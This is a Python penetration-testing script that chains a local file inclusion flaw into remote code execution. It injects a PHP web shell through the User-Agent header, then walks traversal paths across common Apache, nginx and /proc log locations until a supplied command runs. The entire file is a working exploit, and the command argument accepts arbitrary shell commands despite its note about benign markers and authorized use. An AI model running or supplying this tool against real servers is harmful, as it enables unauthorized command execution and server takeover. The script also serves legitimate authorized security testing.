#!/usr/bin/env python3
"""
logpoison.py — LFI->RCE via web-log poisoning helper (LFI_TESTING_GUIDE.md §11).

Step 1: inject a PHP payload into the server's access/error log by sending it in a logged field
        (default: User-Agent).
Step 2: include the log file through the LFI and pass a command -> the PHP in the log executes.

Authorized testing only. Use a BENIGN marker first; you cannot un-write a log line, so note this in
your report and ask the program to rotate/clean the log as part of remediation.

Usage:
  # 1) poison
  python3 logpoison.py poison -u "https://target/"
  # 2) execute (sweep common log paths until the marker runs)
  python3 logpoison.py exec -u "https://target/?page=FUZZ" --cmd "echo LFI-POC-7f3a9"
"""
import argparse, sys, urllib.parse as up
try:
    import requests
    requests.packages.urllib3.disable_warnings()  # noqa
except ImportError:
    sys.exit("pip install requests")

PHP = "<?php system($_GET['c']); ?>"
LOGS = [
    "/var/log/apache2/access.log", "/var/log/apache2/error.log",
    "/var/log/nginx/access.log", "/var/log/nginx/error.log",
    "/var/log/httpd/access_log", "/var/log/httpd/error_log",
    "/var/log/apache/access.log", "/var/log/auth.log", "/var/log/mail.log",
    "/proc/self/environ", "/proc/self/fd/8", "/proc/self/fd/9", "/proc/self/fd/10",
]

def poison(url):
    # send the PHP payload in the User-Agent so it lands verbatim in access.log
    r = requests.get(url, headers={"User-Agent": PHP}, verify=False, timeout=12)
    print(f"[*] sent PHP payload in User-Agent -> {url}  ({r.status_code})")
    print("    also try the request-line trick (path = the PHP payload) if UA is sanitized.")

def execute(url, cmd, depth):
    marker_cmd = up.quote(cmd)
    for log in LOGS:
        for d in range(3, depth + 1):
            trav = "../" * d + log.lstrip("/")
            u = (url.replace("FUZZ", up.quote(trav, safe="/")) if "FUZZ" in url
                 else url + ("&" if "?" in url else "?") + "page=" + up.quote(trav, safe="/"))
            u += ("&" if "?" in u else "?") + "c=" + marker_cmd
            try:
                r = requests.get(u, verify=False, timeout=12)
            except Exception:
                continue
            # crude success check: the marker token appears in the body
            tok = cmd.split()[-1] if cmd.split() else ""
            if tok and tok in r.text:
                print(f"[RCE] log={log} depth={d}\n      {u}\n      -> marker '{tok}' present in response.")
                return True
    print("[*] no log path executed the marker. Try: more depth, error.log, SSH auth.log, "
          "session poisoning (§13), or the php://filter chain (§12).")
    return False

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("action", choices=["poison", "exec"])
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--cmd", default="echo LFI-POC-7f3a9")
    ap.add_argument("--depth", type=int, default=10)
    a = ap.parse_args()
    if a.action == "poison":
        poison(a.url)
    else:
        execute(a.url, a.cmd, a.depth)

if __name__ == "__main__":
    main()
